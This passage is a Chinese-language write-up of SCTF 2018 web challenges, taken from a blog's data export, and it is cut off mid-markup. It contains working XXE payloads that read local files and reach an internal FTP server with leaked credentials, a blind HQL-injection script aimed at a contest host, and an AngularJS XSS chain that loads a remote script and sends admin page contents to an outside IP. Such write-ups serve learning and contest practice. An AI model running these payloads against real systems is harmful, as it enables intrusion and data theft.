class=\"navbar-toggle\" data-toggle=\"collapse\" data-target=\".navbar-collapse\">\n                <span class=\"sr-only\">Toggle navigation</span>\n                <span class=\"icon-bar\"></span>\n                <span class=\"icon-bar\"></span>\n                <span class=\"icon-bar\"></span>\n            </button>\n            <a class=\"navbar-brand\" href=\"/\">Syc Work Notes</a>\n        </div>\n        <div class=\"navbar-collapse collapse\">\n            <ul class=\"nav navbar-nav\">\n                \n          <li><a href=\"/user/admin\">UserInfo</a></li>\n          <li><a href=\"/edit/\">EditMyinfo</a></li>\n                    <li><a href=\"/write_plan/\">Write_your_plan</a></li>\n                    <li><a href=\"/import_and_export/\">import_and_export</a></li>\n          <li><a href=\"/post_bug/\">Post Bug</a></li>\n          <li><a href=\"/auth/logout?url=logout\">Sign Out</a></li>\n        \n            </ul>\n        </div>\n    </div>\n</div>\n\n    \n<div class=\"container\">\n    \n\n    \n<div class=\"page-header\">\n    <h1>Write down your secret plan. Rest assured that no one will see you.</h1>\n</div>\n<ul class=\"posts\">\n    \n<form action=\"\" method=\"post\"\n  class=\"form\" role=\"form\">\n  <input id=\"csrf_token\" name=\"csrf_token\" type=\"hidden\" value=\"Ijc3Mzk4MDMxYmI1NDUwMTA4NTZkOGEzYzhlZjAwZDMxOGZlMjNkMDQi.Dg6C7Q.1hRJWLxrI4d2tPRJMw5y3-WMtpE\">\n  \n    \n\n\n\n\n<div class=\"form-group \"><label class=\"control-label\" for=\"content\">Write your plan</label>\n        \n          <textarea class=\"form-control\" id=\"content\" name=\"content\"></textarea>\n        \n  </div>\n\n\n    \n\n\n\n\n\n  \n\n  \n  \n\n\n    <input class=\"btn btn-default\" id=\"submit\" name=\"submit\" type=\"submit\" value=\"Submit\">\n  \n\n\n\n\n    \n\n</form>\n    \n      <li class=\"post\">\n         <div class=\"post-date\">\n          <span class=\"flask-moment\" data-timestamp=\"2018-05-17T07:46:36Z\" data-format=\"fromNow(0)\" data-refresh=\"0\" style=\"display: none\">2018-05-17T07:46:36Z</span>\n              鏄庢櫄缁村悓缃戞鐨刦tp鏈嶅姟鍣紝syc10ver Eec5TN9fruOOTp2G銆傚瘑鐮佽繖涔堥暱鐪熸槸闅捐锛屽娉ㄤ竴涓媬銆?        </div>\n      </li>\n    \n</ul>\n\n</div>\n\n\n    \n\n    <script src=\"//cdnjs.cloudflare.com/ajax/libs/jquery/1.12.4/jquery.min.js\"></script>\n    <script src=\"//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/js/bootstrap.min.js\"></script>\n<script src=\"//cdnjs.cloudflare.com/ajax/libs/moment.js/2.18.1/moment-with-locales.min.js\"></script>\n<script>\nmoment.locale(\"en\");\nfunction flask_moment_render(elem) {\n    $(elem).text(eval('moment(\"' + $(elem).data('timestamp') + '\").' + $(elem).data('format') + ';'));\n    $(elem).removeClass('flask-moment').show();\n}\nfunction flask_moment_render_all() {\n    $('.flask-moment').each(function() {\n        flask_moment_render(this);\n        if ($(this).data('refresh')) {\n            (function(elem, interval) { setInterval(function() { flask_moment_render(elem) }, interval); })(this, $(this).data('refresh'));\n        }\n    })\n}\n$(document).ready(function() {\n    flask_moment_render_all();\n});\n</script>\n\n  </body>\n</html>\n\n```\n\n从中我们可以得到ftp的账号密码:\n\n> syc10ver         Eec5TN9fruOOTp2G\n\n### xxe 读取/proc/net/arp\n\n```\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE note [\n<!ENTITY file SYSTEM \"file:///proc/net/arp\">\n]>\n<plans>\n    <plan>\n        <content>&file;</content>\n    </plan>\n</plans>\n```\n\n结果如下:\n\n```\n43 minutes ago 172.18.0.1 0x1 0x2 02:42:ca:cd:4e:eb * eth0\n43 minutes ago\n43 minutes ago 172.18.0.4 0x1 0x2 02:42:ac:12:00:04 * eth0\n43 minutes ago\n43 minutes ago 172.18.0.2 0x1 0x2 02:42:ac:12:00:02 * eth0\n```\n\n### xxe读取172.18.0.4:21的目录\n\n```\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE note [\n<!ENTITY file SYSTEM \"ftp://syc10ver:Eec5TN9fruOOTp2G@172.18.0.4:21/\">\n]>\n<plans>\n    <plan>\n        <content>&file;</content>\n    </plan>\n</plans>\n```\n\n结果:\n\n```\n2 minutes ago -rw-r--r-- 1 0 0 38 Jun 17 14:04 flag327a6c4304ad5938eaf0efb6cc3e53dc\n```\n\n### xxe读取172.18.0.4:21/flag327a6c4304ad5938eaf0efb6cc3e53dc\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE note [\n<!ENTITY file SYSTEM \"ftp://syc10ver:Eec5TN9fruOOTp2G@172.18.0.4:21/flag327a6c4304ad5938eaf0efb6cc3e53dc\">\n]>\n<plans>\n    <plan>\n        <content>&file;</content>\n    </plan>\n</plans>\n```\n\n结果:\n\n```\n20 minutes ago sctf{Not_0n1y_xx3_but_als0_web_cache}\n```\n\n##Zhuanxv\n\n### 主要代码片段\n\n```\n//UserLoginAction.class\npublic boolean userCheck(User user) {\n    List < User > userList = this.userService.loginCheck(user.getName(), user.getPassword());\n    if ((userList != null) && (userList.size() == 1)) {\n        return true;\n    }\n    addActionError(\"Username or password is Wrong, please check!\");\n    return false;\n}\n\n//UserServiceImpl.class\npublic List <User> loginCheck(String name, String password) {\n    name = name.replaceAll(\" \", \"\");\n    name = name.replaceAll(\"=\", \"\");\n    Matcher username_matcher = Pattern.compile(\"^[0-9a-zA-Z]+$\").matcher(name);\n    Matcher password_matcher = Pattern.compile(\"^[0-9a-zA-Z]+$\").matcher(password);\n    if (password_matcher.find()) {\n        return this.userDao.loginCheck(name, password);\n    }\n    return null;\n}\n\n//UserDaoImpl.class\npublic List <User> loginCheck(String name, String password) {\n    return getHibernateTemplate().find(\"from User where name ='\" + name + \"' and password = '\" + password + \"'\");\n}\n```\n\n### payload\n\n```\nimport requests\ns=requests.session()\n\n# 漏洞语句 hql\n# from User where name = '\" + name + \"' and password = '\" + password + \"'\"\n# \n# 更简单的payload\n# user.name=1'or(from%0aFlag)like'sctf{%25'or''like'&user.password=asdf\nflag=''\nfor i in range(1,50):\n    p=''\n    for j in range(1,255):\n        # 注意空格需要替换为换行(%0a)或者(%09)W，这是因为代码中将空格替换为\"\"\n        payload=\"(select%0aascii(substr(id,\"+str(i)+\",1))%0afrom%0aFlag%0awhere%0aid<2)<'\"+str(j)+\"'\"\n        #print payload\n        url=\"http://121.196.195.244:9032/zhuanxvlogin?user.name=admin'or%0a\"+payload+\"%0aor%0aname%0alike%0a'admin&user.password=1\"\n        print url\n        r1=s.get(url)\n        #print url\n        #print len(r1.text)\n        if len(r1.text)>20000 and p!='':\n            flag+=p\n            print i,flag\n            break\n        p=chr(j)\n\n# http://121.196.195.244:9032/zhuanxvlogin?user.name=admin'or%0a(select%0Aascii(substr(id,1,1))%0Afrom%0AFlag%0Awhere%0Aid<2)<'116'%0aor%0aname%0alike%0a'admin&user.password=1\n# user.name=1'or(from%0aFlag)like'sctf{%25'or''like'&user.password=aaaa\n```\n\n## BabySyc - Simple PHP Web\n\n```\n\n```","slug":"sctf2018","published":1,"updated":"2018-07-23T12:34:55.168Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjkia12i5001eqkdlc26du460","content":"<h2 id=\"新的建议板\"><a href=\"#新的建议板\" class=\"headerlink\" title=\"新的建议板\"></a>新的建议板</h2><a id=\"more\"></a>\n<ol>\n<li><p>基础payload</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;<span class=\"string\">'a'</span>.constructor.prototype.charAt=[].join;$<span class=\"built_in\">eval</span>(<span class=\"string\">'x=1&#125; &#125; &#125;;eval(alert(1))//'</span>);&#125;&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>打cookie</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;<span class=\"string\">'a'</span>.constructor.prototype.charAt=[].join;$<span class=\"built_in\">eval</span>(<span class=\"string\">'x=1&#125; &#125; &#125;;eval(atob(\\'JC5nZXRTY3JpcHQoJ2h0dHBzOi8veHNzcHQuY29tL0hNVHpNUycpCg==\\'))//'</span>);&#125;&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>调用script</p>\n<p>使用</p>\n<blockquote>\n<p>$.getScript(‘<a href=\"https://xsspt.com/HMTzMS&#39;\" target=\"_blank\" rel=\"noopener\">https://xsspt.com/HMTzMS&#39;</a>)</p>\n</blockquote>\n<blockquote>\n<p>base64一下: <code>JC5nZXRTY3JpcHQoJ2h0dHBzOi8veHNzcHQuY29tL0hNVHpNUycpCg==</code></p>\n</blockquote>\n</li>\n<li><p>这样就可以拿到cookie</p>\n<p>接收到的内容如下:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location : http://127.0.0.1:1002/admin/suggest?suggest=%7B%7B&apos;a&apos;.constructor.prototype.charAt=[].join;$eval(&apos;x=1%7D%20%7D%20%7D;eval(atob(%5C&apos;JC5nZXRTY3JpcHQoJ2h0dHBzOi8veHNzcHQuY29tL0hNVHpNUycpCg==%5C&apos;))//&apos;);%7D%7D</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>cookie里边并没有flag，并且给的地址为本地地址，并不在公网上。</p>\n</li>\n<li><p>获取<code>/admin</code>的内容</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">JC5nZXRTY3JpcHQoJ2h0dHA6Ly8xMjMuMjA3LjkwLjE0My9zdS5qcycpCg==</span><br><span class=\"line\">=&gt;</span><br><span class=\"line\">$.getScript(&apos;http://123.207.90.143/su.js&apos;)</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;&apos;a&apos;.constructor.prototype.charAt=[].join;$eval(&apos;x=1&#125; &#125; &#125;;eval(atob(\\&apos;JC5nZXRTY3JpcHQoJ2h0dHA6Ly8xMjMuMjA3LjkwLjE0My9zdS5qcycpCg==\\&apos;))//&apos;);&#125;&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>su.js内容即paylaod如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$.ajax(&#123;</span><br><span class=\"line\">    url: &quot;/admin&quot;,</span><br><span class=\"line\">    type: &quot;GET&quot;,</span><br><span class=\"line\">    dataType: &quot;text&quot;,</span><br><span class=\"line\">    success: function(result) &#123;</span><br><span class=\"line\">        var code = btoa(encodeURIComponent(result));</span><br><span class=\"line\">        xssPost(&apos;http://123.207.90.143&apos;, code);</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    error: function(msg) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">function xssPost(url, postStr) &#123;</span><br><span class=\"line\">    var de;</span><br><span class=\"line\">    de = document.body.appendChild(document.createElement(&apos;iframe&apos;));</span><br><span class=\"line\">    de.src = &apos;about:blank&apos;;</span><br><span class=\"line\">    de.height = 1;</span><br><span class=\"line\">    de.width = 1;</span><br><span class=\"line\">    de.contentDocument.write(&apos;&lt;form method=&quot;GET&quot; action=&quot;&apos; + url + &apos;&quot;&gt;&lt;input name=&quot;code&quot; value=&quot;&apos; + postStr + &apos;&quot;/&gt;&lt;/form&gt;&apos;);</span><br><span class=\"line\">    de.contentDocument.forms[0].submit();</span><br><span class=\"line\">    de.style.display = &apos;none&apos;;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>admin内容如下:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">JTBEJTBBJTNDIURPQ1RZUEUlMjBodG1sJTNFJTBEJTBBJTNDaHRtbCUyMGxhbmclM0QlMjJ6aC1DTiUyMiUzRSUwRCUwQSUyMCUyMCUzQ2hlYWQlM0UlMEQlMEElMjAlMjAlMjAlMjAlM0NtZXRhJTIwY2hhcnNldCUzRCUyMnV0Zi04JTIyJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTNDbWV0YSUyMGh0dHAtZXF1aXYlM0QlMjJYLVVBLUNvbXBhdGlibGUlMjIlMjBjb250ZW50JTNEJTIySUUlM0RlZGdlJTIyJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTNDbWV0YSUyMG5hbWUlM0QlMjJ2aWV3cG9ydCUyMiUyMGNvbnRlbnQlM0QlMjJ3aWR0aCUzRGRldmljZS13aWR0aCUyQyUyMGluaXRpYWwtc2NhbGUlM0QxJTIyJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTNDIS0tJTIwJUU0JUI4JThBJUU4JUJGJUIwMyVFNCVCOCVBQW1ldGElRTYlQTAlODclRTclQUQlQkUqJUU1JUJGJTg1JUU5JUExJUJCKiVFNiU5NCVCRSVFNSU5QyVBOCVFNiU5QyU4MCVFNSU4OSU4RCVFOSU5RCVBMiVFRiVCQyU4QyVFNCVCQiVCQiVFNCVCRCU5NSVFNSU4NSVCNiVFNCVCQiU5NiVFNSU4NiU4NSVFNSVBRSVCOSVFOSU4MyVCRColRTUlQkYlODUlRTklQTElQkIqJUU4JUI3JTlGJUU5JTlBJThGJUU1JTg1JUI2JUU1JTkwJThFJUVGJUJDJTgxJTIwLS0lM0UlMEQlMEElMjAlMjAlMjAlMjAlM0NtZXRhJTIwbmFtZSUzRCUyMmRlc2NyaXB0aW9uJTIyJTIwY29udGVudCUzRCUyMiUyMiUzRSUwRCUwQSUyMCUyMCUyMCUyMCUzQ21ldGElMjBuYW1lJTNEJTIyYXV0aG9yJTIyJTIwY29udGVudCUzRCUyMiUyMiUzRSUwRCUwQSUyMCUyMCUyMCUyMCUzQ2xpbmslMjByZWwlM0QlMjJpY29uJTIyJTIwaHJlZiUzRCUyMiUyMiUzRSUwRCUwQSUwRCUwQSUyMCUyMCUyMCUyMCUzQ3RpdGxlJTNFU1lDJTNDJTJGdGl0bGUlM0UlMEQlMEElMEQlMEElMEQlMEElMjAlMjAlMjAlMjAlM0NsaW5rJTIwaHJlZiUzRCUyMmh0dHBzJTNBJTJGJTJGY2RuLmJvb3Rjc3MuY29tJTJGYm9vdHN0cmFwJTJGMy4zLjclMkZjc3MlMkZib290c3RyYXAubWluLmNzcyUyMiUyMHJlbCUzRCUyMnN0eWxlc2hlZXQlMjIlM0UlMEQlMEElMjAlMjAlMjAlMjAlM0NsaW5rJTIwaHJlZiUzRCUyMmNzcyUyRmllMTAtdmlld3BvcnQtYnVnLXdvcmthcm91bmQuY3NzJTIyJTIwcmVsJTNEJTIyc3R5bGVzaGVldCUyMiUzRSUwRCUwQSUyMCUyMCUyMCUyMCUzQ2xpbmslMjBocmVmJTNEJTIyY3NzJTJGc3RhcnRlci10ZW1wbGF0ZS5jc3MlMjIlMjByZWwlM0QlMjJzdHlsZXNoZWV0JTIyJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTNDc3R5bGUlMjB0eXBlJTNEJTIydGV4dCUyRmNzcyUyMiUzRSUwRCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMGJvZHklMjAlN0IlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjBwYWRkaW5nLXRvcCUzQSUyMDYwcHglM0IlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjBwYWRkaW5nLWJvdHRvbSUzQSUyMDQwcHglM0IlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlN0QlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0MlMkZzdHlsZSUzRSUwRCUwQSUwRCUwQSUyMCUyMCUyMCUyMCUzQ3NjcmlwdCUyMHNyYyUzRCUyMmh0dHBzJTNBJTJGJTJGY2RuLmJvb3Rjc3MuY29tJTJGYW5ndWxhci5qcyUyRjEuNC42JTJGYW5ndWxhci5taW4uanMlMjIlM0UlM0MlMkZzY3JpcHQlM0UlMEQlMEElMjAlMjAlMjAlMjAlM0NzY3JpcHQlMjBzcmMlM0QlMjJodHRwcyUzQSUyRiUyRmFwcHMuYmRpbWcuY29tJTJGbGlicyUyRmFuZ3VsYXItcm91dGUlMkYxLjMuMTMlMkZhbmd1bGFyLXJvdXRlLmpzJTIyJTNFJTNDJTJGc2NyaXB0JTNFJTBEJTBBJTIwJTIwJTIwJTIwJTNDc2NyaXB0JTIwc3JjJTNEJTIyanMlMkZpZS1lbXVsYXRpb24tbW9kZXMtd2FybmluZy5qcyUyMiUzRSUzQyUyRnNjcmlwdCUzRSUwRCUwQSUwRCUwQSUyMCUyMCUzQyUyRmhlYWQlM0UlMEQlMEElMEQlMEElMjAlMjAlM0Nib2R5JTIwJTNFJTBEJTBBJTBEJTBBJTIwJTIwJTIwJTIwJTNDbmF2JTIwY2xhc3MlM0QlMjJuYXZiYXIlMjBuYXZiYXItaW52ZXJzZSUyMG5hdmJhci1maXhlZC10b3AlMjIlM0UlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlM0NkaXYlMjBjbGFzcyUzRCUyMmNvbnRhaW5lciUyMiUzRSUwRCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ2RpdiUyMGNsYXNzJTNEJTIybmF2YmFyLWhlYWRlciUyMiUzRSUwRCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ2J1dHRvbiUyMHR5cGUlM0QlMjJidXR0b24lMjIlMjBjbGFzcyUzRCUyMm5hdmJhci10b2dnbGUlMjBjb2xsYXBzZWQlMjIlMjBkYXRhLXRvZ2dsZSUzRCUyMmNvbGxhcHNlJTIyJTIwZGF0YS10YXJnZXQlM0QlMjIlMjNuYXZiYXIlMjIlMjBhcmlhLWV4cGFuZGVkJTNEJTIyZmFsc2UlMjIlMjBhcmlhLWNvbnRyb2xzJTNEJTIybmF2YmFyJTIyJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDc3BhbiUyMGNsYXNzJTNEJTIyc3Itb25seSUyMiUzRVRvZ2dsZSUyMG5hdmlnYXRpb24lM0MlMkZzcGFuJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDc3BhbiUyMGNsYXNzJTNEJTIyaWNvbi1iYXIlMjIlM0UlM0MlMkZzcGFuJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDc3BhbiUyMGNsYXNzJTNEJTIyaWNvbi1iYXIlMjIlM0UlM0MlMkZzcGFuJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDc3BhbiUyMGNsYXNzJTNEJTIyaWNvbi1iYXIlMjIlM0UlM0MlMkZzcGFuJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDJTJGYnV0dG9uJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDYSUyMGNsYXNzJTNEJTIybmF2YmFyLWJyYW5kJTIyJTIwaHJlZiUzRCUyMiUyRiUyMiUzRVNZQyUyMEFETUlOJTNDJTJGYSUzRSUwRCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQyUyRmRpdiUzRSUwRCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ2RpdiUyMGlkJTNEJTIybmF2YmFyJTIyJTIwY2xhc3MlM0QlMjJjb2xsYXBzZSUyMG5hdmJhci1jb2xsYXBzZSUyMiUzRSUwRCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ3VsJTIwY2xhc3MlM0QlMjJuYXYlMjBuYXZiYXItbmF2JTIyJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDbGklMjBjbGFzcyUzRCUyMmFjdGl2ZSUyMiUzRSUzQ2ElMjBocmVmJTNEJTIyJTIzJTIyJTNFSG9tZSUzQyUyRmElM0UlM0MlMkZsaSUzRSUwRCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ2xpJTNFJTNDYSUyMGhyZWYlM0QlMjIlMjMlMjIlM0UlRTYlOTclQTUlRTUlQkYlOTclM0MlMkZhJTNFJTNDJTJGbGklM0UlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0NsaSUzRSUzQ2ElMjBocmVmJTNEJTIyJTIzJTIyJTNFJUU4JUI0JUE2JUU1JThEJTk1JTNDJTJGYSUzRSUzQyUyRmxpJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDbGklM0UlM0NhJTIwaHJlZiUzRCUyMmFkbWluJTJGZmlsZSUyMiUzRSVFNiU5NiU4NyVFNCVCQiVCNiUzQyUyRmElM0UlM0MlMkZsaSUzRSUwRCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ2xpJTNFJTNDYSUyMGhyZWYlM0QlMjJhZG1pbiUyRnN1Z2dlc3QlMjIlM0UlRTclOTUlOTklRTglQTglODAlM0MlMkZhJTNFJTNDJTJGbGklM0UlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0NsaSUzRSUzQ2ElMjBocmVmJTNEJTIyJTIzJTIyJTNFJUU1JThGJTkxJUU1JUI4JTgzJTNDJTJGYSUzRSUzQyUyRmxpJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDJTJGdWwlM0UlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0MlMkZkaXYlM0UlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlM0MlMkZkaXYlM0UlMEQlMEElMjAlMjAlMjAlMjAlM0MlMkZuYXYlM0UlMEQlMEElMEQlMEElMEQlMEElM0NkaXYlMjBjbGFzcyUzRCUyMmNvbnRhaW5lciUyMiUzRSUwRCUwQSUyMCUyMCUzQ2RpdiUyMGNsYXNzJTNEJTIyanVtYm90cm9uJTIyJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDaDElM0VIRUxMTyUyMGFkbWluQ2xvdW5kJTNDJTJGaDElM0UlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0NwJTNFJUU2JTk2JUIwJUU3JTg5JTg4JUU1JTkwJThFJUU1JThGJUIwMi4wISUzQyUyRnAlM0UlMEQlMEElMjAlMjAlM0MlMkZkaXYlM0UlMEQlMEElM0MlMkZkaXYlM0UlMEQlMEElMEQlMEElMEQlMEElMjAlMjAlMjAlMjAlM0MhLS0lMjBCb290c3RyYXAlMjBjb3JlJTIwSmF2YVNjcmlwdCUwRCUwQSUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUyMC0tJTNFJTBEJTBBJTNDIS0tJTIwUGxhY2VkJTIwYXQlMjB0aGUlMjBlbmQlMjBvZiUyMHRoZSUyMGRvY3VtZW50JTIwc28lMjB0aGUlMjBwYWdlcyUyMGxvYWQlMjBmYXN0ZXIlMjAtLSUzRSUwRCUwQSUzQ3NjcmlwdCUyMHNyYyUzRCUyMmh0dHBzJTNBJTJGJTJGY2RuLmJvb3Rjc3MuY29tJTJGanF1ZXJ5JTJGMS4xMi40JTJGanF1ZXJ5Lm1pbi5qcyUyMiUzRSUzQyUyRnNjcmlwdCUzRSUwRCUwQSUzQ3NjcmlwdCUyMHNyYyUzRCUyMmh0dHBzJTNBJTJGJTJGY2RuLmJvb3Rjc3MuY29tJTJGYm9vdHN0cmFwJTJGMy4zLjclMkZqcyUyRmJvb3RzdHJhcC5taW4uanMlMjIlM0UlM0MlMkZzY3JpcHQlM0UlMEQlMEElM0MhLS0lMjBJRTEwJTIwdmlld3BvcnQlMjBoYWNrJTIwZm9yJTIwU3VyZmFjZSUyRmRlc2t0b3AlMjBXaW5kb3dzJTIwOCUyMGJ1ZyUyMC0tJTNFJTBEJTBBJTNDc2NyaXB0JTIwc3JjJTNEJTIyanMlMkZpZTEwLXZpZXdwb3J0LWJ1Zy13b3JrYXJvdW5kLmpzJTIyJTNFJTNDJTJGc2NyaXB0JTNFJTBEJTBBJTBEJTBBJTNDJTJGYm9keSUzRSUwRCUwQSUzQyUyRmh0bWwlM0UlMEQlMEElMEQlMEE%3D</span><br></pre></td></tr></table></figure>\n<p>解码后:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">...</span><br><span class=\"line\">&lt;div class=&quot;container&quot;&gt;</span><br><span class=\"line\">  &lt;div class=&quot;jumbotron&quot;&gt;</span><br><span class=\"line\">        &lt;h1&gt;HELLO adminClound&lt;/h1&gt;</span><br><span class=\"line\">        &lt;p&gt;新版后台2.0!&lt;/p&gt;</span><br><span class=\"line\">  &lt;/div&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>获取<code>admin/file</code>，需要登录</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;div class=&quot;container&quot;&gt;</span><br><span class=\"line\">  &lt;form method=&quot;post&quot;&gt;</span><br><span class=\"line\">    &lt;label for=&quot;filePasswd&quot; class=&quot;sr-only&quot;&gt;输入文件密码&lt;/label&gt;</span><br><span class=\"line\">    &lt;input type=&quot;text&quot; id=&quot;filePasswd&quot; class=&quot;form-control&quot; placeholder=&quot;filepasswd&quot; required=&quot;&quot; autofocus=&quot;&quot; name=&quot;filepasswd&quot;&gt;</span><br><span class=\"line\">    &lt;button class=&quot;btn btn-lg btn-primary btn-block&quot; type=&quot;submit&quot;&gt;提交&lt;/button&gt;</span><br><span class=\"line\">  &lt;/form&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>我们发现新的用户</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">adminClound</span><br></pre></td></tr></table></figure>\n<p>结合路由:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://116.62.137.114:4879/api/memos/admintest2313</span><br></pre></td></tr></table></figure>\n<p>访问<code>http://116.62.137.114:4879/api/memos/adminClound</code></p>\n<p>得到<code>adminClound</code>的密码:<code>HGf^&amp;39NsslUIf^23</code></p>\n</li>\n<li><p>登录<code>admin/file</code></p>\n<p>paylaod如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span 